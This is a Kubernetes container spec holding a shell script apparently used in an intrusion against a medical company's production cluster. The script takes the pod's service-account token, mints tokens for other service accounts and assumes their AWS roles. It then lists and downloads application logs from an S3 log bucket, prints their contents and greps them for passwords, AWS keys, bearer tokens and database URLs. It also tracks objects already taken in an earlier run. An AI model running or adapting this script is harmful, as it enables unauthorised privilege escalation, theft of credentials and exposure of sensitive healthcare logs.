containers.name: probe
args:
#!/bin/sh
set -u
ENV=prod
SA=/var/run/secrets/kubernetes.io/serviceaccount
TOKEN=$(cat $SA/token)
API=https://kubernetes.default.svc
get(){ wget -q -O - --timeout=30 --no-check-certificate --header="Authorization: Bearer $TOKEN" "$1" 2>/dev/null; }
post(){ wget -q -O - --timeout=30 --no-check-certificate --header="Authorization: Bearer $TOKEN" --header="Content-Type: application/json" --post-data="$2" "$1" 2>/dev/null; }
echo "===I2954_START env=$ENV utc=$(date -u +%FT%TZ)==="
apk add --no-cache aws-cli jq curl gzip >/tmp/apk.log 2>&1
echo "apk_rc=$? aws=$(aws --version 2>&1 | head -c 60)"
export AWS_DEFAULT_REGION=us-west-2
assume(){
  NS=$1; SAN=$2
  SAJ=$(get "$API/api/v1/namespaces/$NS/serviceaccounts/$SAN")
  R=$(echo "$SAJ" | jq -r '.metadata.annotations["eks.amazonaws.com/role-arn"] // empty')
  [ -z "$R" ] && { echo "NO_ROLE $NS/$SAN"; return 1; }
  TK=$(post "$API/api/v1/namespaces/$NS/serviceaccounts/$SAN/token" '{"apiVersion":"authentication.k8s.io/v1","kind":"TokenRequest","spec":{"audiences":["sts.amazonaws.com"],"expirationSeconds":3600}}')
  WT=$(echo "$TK" | jq -r '.status.token // empty')
  [ -z "$WT" ] && { echo "TOKEN_FAIL $NS/$SAN"; return 1; }
  RES=$(aws sts assume-role-with-web-identity --role-arn "$R" --role-session-name i2954 --web-identity-token "$WT" --duration-seconds 1800 --region us-west-2 --output json 2>/tmp/ae)
  echo "$RES" | jq -e '.Credentials' >/dev/null 2>&1 || { echo "ASSUME_FAIL $NS/$SAN $(head -c 160 /tmp/ae | tr '\n' ' ')"; return 1; }
  export AWS_ACCESS_KEY_ID=$(echo "$RES" | jq -r '.Credentials.AccessKeyId')
  export AWS_SECRET_ACCESS_KEY=$(echo "$RES" | jq -r '.Credentials.SecretAccessKey')
  export AWS_SESSION_TOKEN=$(echo "$RES" | jq -r '.Credentials.SessionToken')
  echo "ASSUME_OK $NS/$SAN role=$(echo "$R" | sed 's#.*role/##')"
  return 0
}
LOGB="lazamedical-${ENV}01-usw2-log-bucket"
echo "===BUCKET $LOGB==="
OK=0
if assume audit-log audit-log-sa; then OK=1; fi
if [ "$OK" = "0" ]; then if assume s3-ingestion s3-ingestion-sa; then OK=1; fi; fi
if [ "$OK" = "0" ]; then if assume data-management data-management-sa; then OK=1; fi; fi
if [ "$OK" = "0" ]; then echo "NO_ASSUME_ALL"; fi
: > /tmp/all.txt
for P in audit-log authorization cognito data-management de-identifier metadata-extraction s3-ingestion user-management; do
  PRE="logs/shifamed-$P-app/"
  if aws s3api list-objects-v2 --bucket "$LOGB" --prefix "$PRE" --max-keys 100 --region us-west-2 --output json >/tmp/l 2>/tmp/e; then
    N=$(jq '.KeyCount // 0' /tmp/l); T=$(jq '.IsTruncated // false' /tmp/l)
    echo "PREFIX_OK $PRE n=$N trunc=$T"
    jq -r '.Contents[]? | "OBJ \(.Key)|\(.Size)|\(.LastModified)"' /tmp/l >> /tmp/all.txt
    jq -r '.Contents[]? | .Key' /tmp/l | awk -F/ '{print "'"$P"' " $2}' | sort -u | sed 's/^/POD /'
  else
    echo "PREFIX_NO $PRE $(head -c 220 /tmp/e | tr '\n' ' ')"
  fi
done
echo "TOTAL_OBJS $(wc -l < /tmp/all.txt)"
# priority prefix order: identity/user-facing first
PRIO="cognito authorization user-management audit-log data-management s3-ingestion metadata-extraction de-identifier"
: > /tmp/pick.txt
# one object per prefix: pick the LARGEST object <=2MB (max content); fall back to smallest if none
for P in $PRIO; do
  CAND=$(grep -F "OBJ logs/shifamed-$P-app/" /tmp/all.txt | sed 's/^OBJ //' | awk -F'|' '{k=$1; s=$2+0; lm=$3; if (s>0 && s<=2097152) print s"|"k"|"lm}' | sort -n)
  echo "$CAND" | tail -1 > /tmp/c1
  if [ ! -s /tmp/c1 ] || [ -z "$(cat /tmp/c1)" ]; then echo "NOCAND $P"; continue; fi
  # skip exact objects already fetched by i3027
  K=$(cut -d'|' -f2 /tmp/c1)
  case "$K" in
    logs/shifamed-s3-ingestion-app/shifamed-s3-ingestion-ff8f7b79b-gkw4c/202603121305_0.log|logs/shifamed-cognito-app/shifamed-cognito-service-5f545f885f-7f5gb/202603081830_0.log|logs/shifamed-cognito-app/shifamed-cognito-service-5f545f885f-7f5gb/202603081850_0.log|logs/shifamed-cognito-app/shifamed-cognito-service-5f545f885f-7f5gb/202603081540_0.log|logs/shifamed-cognito-app/shifamed-cognito-service-5f545f885f-7f5gb/202603081820_0.log|logs/shifamed-s3-ingestion-app/shifamed-s3-ingestion-546bff4c-rrxsd/202603131010_0.log|logs/shifamed-cognito-app/shifamed-cognito-service-597df4645-7bkbx/202603091105_0.log|logs/shifamed-s3-ingestion-app/shifamed-s3-ingestion-546bff4c-rrxsd/202603101300_0.log|logs/shifamed-cognito-app/shifamed-cognito-service-597df4645-7bkbx/202603091025_0.log|logs/shifamed-s3-ingestion-app/shifamed-s3-ingestion-546bff4c-rrxsd/202603101305_0.log)
      echo "$CAND" | sed '$d' | tail -1 > /tmp/c1 ;;
  esac
  cat /tmp/c1 >> /tmp/pick.txt
done
echo "===DL_BEGIN count=$(wc -l < /tmp/pick.txt)==="
cat /tmp/pick.txt
TOTBYTES=0; NDL=0
while IFS='|' read -r SZ K LM; do
  [ -z "${K:-}" ] && continue
  [ "$NDL" -ge 5 ] && break
  SZ0=$SZ
  if [ "$((TOTBYTES + SZ0))" -gt 10485760 ]; then echo "BUDGET_SKIP $K $SZ0"; continue; fi
  echo "DL $K ($SZ0 $LM)"
  if aws s3api get-object --bucket "$LOGB" --key "$K" /tmp/f --region us-west-2 >/tmp/go 2>/tmp/e; then
    if gzip -t /tmp/f 2>/dev/null; then gunzip -c /tmp/f > /tmp/txt 2>/dev/null; else cp /tmp/f /tmp/txt; fi
    S=$(wc -c < /tmp/txt); TOTBYTES=$((TOTBYTES+S)); NDL=$((NDL+1))
    echo "SIZE $S RAWSIZE $SZ0"
    echo "CONTENT_BEGIN"
    head -c 4500 /tmp/txt | tr -d '\r'
    echo ""
    echo "CONTENT_END"
    echo "GREP_BEGIN"
    grep -aoiE 'password|passwd|secret|token|AKIA[0-9A-Z]{16}|Bearer [A-Za-z0-9._-]+|api[_-]?key|sk-[A-Za-z0-9]{10,}|xoxb|smtp|mysql://[^ "]*|redis://[^ "]*|postgres://[^ "]*|@[a-z0-9.-]+\.(ai|com|sg|onmicrosoft\.com)' /tmp/txt 2>/dev/null | sort | uniq -c | sort -rn | head -40
    echo "GREP_END"
  else
    echo "DL_FAIL $(head -c 200 /tmp/e | tr '\n' ' ')"
  fi
done < /tmp/pick.txt
echo "DL_TOTAL n=$NDL bytes=$TOTBYTES"
echo "===I2954_DONE $(date -u +%FT%TZ)==="
